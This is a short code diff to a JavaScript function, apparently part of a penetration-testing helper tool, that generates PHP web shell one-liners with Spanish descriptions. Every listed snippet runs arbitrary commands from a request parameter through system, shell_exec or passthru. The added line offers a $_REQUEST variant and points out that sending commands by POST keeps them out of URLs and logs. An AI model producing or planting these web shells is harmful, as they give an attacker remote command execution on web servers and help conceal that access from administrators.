@@ -5778,6 +5778,7 @@ function renderWebshell(){
   const param=((document.getElementById('webshellParam')?.value)||'cmd').trim()||'cmd';
   const shells=[
     {code:`<?php system($_GET['${param}']); ?>`, d:'Básico — ejecuta el comando y muestra la salida'},
+    {code:`<?php system($_REQUEST["${param}"]); ?>`, d:'Con $_REQUEST — acepta el parámetro por GET, POST o cookie (más flexible; por POST no queda en la URL ni en los logs)'},
     {code:`<?php echo shell_exec($_GET['${param}']); ?>`, d:'Con shell_exec — útil si system está deshabilitado'},
     {code:`<?php if(isset($_GET['${param}'])){echo "<pre>".shell_exec($_GET['${param}'])."</pre>";} ?>`, d:'Con comprobación y salida en <pre> (más legible)'},
     {code:`<?php passthru($_GET['${param}']); ?>`, d:'Con passthru — otra alternativa si las demás están filtradas'},
